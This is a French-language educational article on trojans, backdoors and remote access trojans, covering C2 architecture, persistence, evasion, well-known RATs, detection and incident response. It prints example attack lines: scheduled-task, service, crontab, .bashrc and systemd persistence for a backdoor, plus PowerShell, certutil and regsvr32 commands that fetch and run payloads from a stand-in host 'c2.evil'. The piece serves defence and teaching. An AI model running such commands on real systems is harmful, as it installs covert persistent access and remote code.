# Trojans et backdoors : anatomie des accès persistants

Les trojans et backdoors sont les outils préférés des attaquants pour maintenir un accès discret et durable sur les systèmes compromis. Comprendre leur fonctionnement est essentiel pour les détecter et s'en défendre.

## Définitions

### Trojan (Cheval de Troie)
Programme malveillant qui se dissimule dans une application légitime. L'utilisateur installe volontairement le logiciel en pensant qu'il est bénin — le malware s'exécute en arrière-plan.

**Exemples classiques :**
- Faux codec vidéo qui installe un keylogger
- Crack de logiciel avec RAT intégré
- Application Android qui demande des permissions excessives

### Backdoor
Accès caché à un système, contournant l'authentification normale. Peut être installé par un trojan ou directement par un attaquant après une compromission.

### RAT (Remote Access Trojan)
Combinaison des deux : trojan qui installe une backdoor permettant un contrôle à distance complet.

## Fonctionnement technique

### Architecture C2 (Command and Control)

```
[Attaquant] ←→ [Serveur C2] ←→ [Machine compromise]

Exemples de protocoles C2 :
- HTTP/HTTPS (difficile à bloquer)
- DNS (très discret)
- ICMP (inhabituel)
- Réseaux sociaux (Twitter, GitHub comme C2)
```

### Mécanismes de persistance

Les backdoors s'assurent de survivre aux redémarrages :

**Windows :**
```
Clés de registre :
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

Dossier de démarrage :
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

Tâches planifiées :
schtasks /create /tn "WindowsUpdate" /tr "C:\temp\backdoor.exe" /sc onlogon

Services Windows :
sc create "WindowsHelper" binpath= "C:\temp\backdoor.exe" start= auto
```

**Linux :**
```bash
# Crontab
(crontab -l; echo "@reboot /tmp/.hidden/backdoor") | crontab -

# .bashrc / .profile
echo "nohup /tmp/.hidden/backdoor &" >> ~/.bashrc

# Service systemd
cat > /etc/systemd/system/network-helper.service << EOF
[Unit]
Description=Network Helper Service
[Service]
ExecStart=/tmp/.hidden/backdoor
Restart=always
[Install]
WantedBy=multi-user.target
EOF
```

### Techniques d'évasion

**Obfuscation du code**
```python
# Code malveillant obfusqué (encodage base64 + eval)
import base64, exec
exec(base64.b64decode("aW1wb3J0IHNvY2tldA==").decode())
```

**Living Off the Land (LotL)**
Utiliser des outils légitimes Windows pour éviter la détection :
```powershell
# PowerShell télécharge et exécute en mémoire
IEX (New-Object Net.WebClient).DownloadString('http://c2.evil/payload.ps1')

# certutil pour télécharger des fichiers
certutil -urlcache -f http://c2.evil/backdoor.exe C:\temp\update.exe

# regsvr32 pour exécuter du code
regsvr32 /s /n /u /i:http://c2.evil/payload.sct scrobj.dll
```

**Process injection**
```
Injecter le code malveillant dans un processus légitime (explorer.exe, svchost.exe)
→ Le malware s'exécute sous l'identité du processus légitime
→ Moins suspect dans le gestionnaire de tâches
→ Peut contourner les firewalls applicatifs
```

## Les RATs courants

### Cobalt Strike (légitime mais souvent détourné)
Framework de pentest très complet, malheureusement cracké et utilisé par des groupes APT. Beacon, son agent, est l'un des C2 les plus utilisés dans les attaques réelles.

### AsyncRAT
RAT open source avec chiffrement TLS, keylogger, screenshots, reverse shell. Très utilisé dans les campagnes de phishing.

### njRAT / Bladabindi
RAT simple et efficace, très répandu dans les pays arabophones. Fonctionnalités : accès webcam, keylogger, vol de mots de passe.

### Remcos RAT
Commercialisé comme outil d'administration à distance légitime, souvent distribué via des pièces jointes malveillantes.

## Détection des backdoors

### Analyse réseau
```bash
# Connexions établies suspectes
netstat -ano | findstr ESTABLISHED
ss -tlnp

# Connexions vers des IPs suspectes
# Chercher des connexions vers des ports inhabituels
# Ou des connexions permanentes vers des IPs inconnues

# Trafic DNS anormal
# Trop de requêtes DNS vers des sous-domaines aléatoires = DGA ou DNS tunneling
```

### Analyse des processus
```powershell
# Processus avec connexions réseau
Get-NetTCPConnection | Where-Object {$_.State -eq "Established"} | 
  Select-Object LocalPort, RemoteAddress, RemotePort, 
    @{N='Process';E={(Get-Process -Id $_.OwningProcess).Name}}

# Processus sans executable sur disque (fileless)
Get-Process | Where-Object {$_.Path -eq $null}

# Processus injectés (vérifier les modules)
# Utiliser Process Hacker ou ProcessExplorer (Sysinternals)
```

### Analyse des démarrages automatiques
```powershell
# Autoruns (Sysinternals) - L'outil de référence
# Affiche TOUT ce qui démarre automatiquement

# Via PowerShell
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

# Tâches planifiées suspectes
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft*"} |
  Select-Object TaskName, @{N='Execute';E={$_.Actions.Execute}}
```

### EDR et détection comportementale

Les solutions EDR (CrowdStrike, SentinelOne, Microsoft Defender for Endpoint) détectent les backdoors par :
- Analyse comportementale (quel processus fait quoi)
- Détection d'injection de processus
- Surveillance des clés de registre sensibles
- Analyse du trafic réseau au niveau endpoint

## Réponse à incident

Si une backdoor est suspectée :

```
1. ISOLER la machine du réseau (ne pas éteindre)
2. CAPTURER la mémoire (dump RAM) avant extinction
3. CRÉER une image disque
4. ANALYSER les artefacts :
   - Logs événements Windows
   - Prefetch files
   - Timeline NTFS ($MFT)
   - Network captures
5. IDENTIFIER le vecteur initial
6. RECONSTRUIRE la timeline
7. NETTOYER et RECONSTRUIRE (ne pas réutiliser un système compromis)
```

## Conclusion

Les trojans et backdoors modernes sont sophistiqués, discrets et persistants. La détection repose sur une surveillance comportementale plutôt que sur les signatures seules. Un EDR, une surveillance réseau active et une politique de moindre privilège réduisent considérablement le risque d'une persistance non détectée.
